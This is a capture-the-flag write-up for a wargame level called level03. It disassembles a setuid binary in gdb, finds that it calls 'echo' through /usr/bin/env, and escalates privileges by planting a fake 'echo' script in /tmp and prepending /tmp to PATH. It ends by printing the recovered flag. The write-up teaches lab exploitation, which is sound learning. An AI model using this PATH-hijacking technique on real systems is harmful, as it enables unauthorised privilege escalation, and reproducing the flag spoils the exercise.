# level03

- We log as `level03`

- A `level03` file is located inside the home directory of level03

- This is an executable file with special rights:
	>`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`

- Trying to execute it being logged as `level03` will execute it as `flag03`

- Uppon execution it displays `Exploit me`

- We dissasemble the binary using gdb, here is the `main` function:
```asm
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret
```

- We can see multiple function calls but the interesting one is `system` :
	>`0x080484fe <+90>:    call   0x80483b0 <system@plt>`

- The line above moves the argument of `system` on top of the stack:
	>`0x080484f7 <+83>:    movl   $0x80485e0,(%esp)`

- Let's display the content of `0x80485e0` with `(gdb) x/s 0x80485e0` :
	>`0x80485e0:       "/usr/bin/env echo Exploit me"`

- We can see that the `echo` command is vulnerable to `PATH` environment variable manipulation because it is called using `/usr/bin/env` which forces the binary to be found inside `PATH` variable

- We create a shell script named `echo` inside `/tmp` which contains:
	>`getflag`

- We add `/tmp` at the front of `PATH` with:
	>`export PATH=/tmp:$PATH`

- We run `./level03` inside the home directory of `level03`

- We get the flag `qi0maab88jeaj46qoumi7maus`
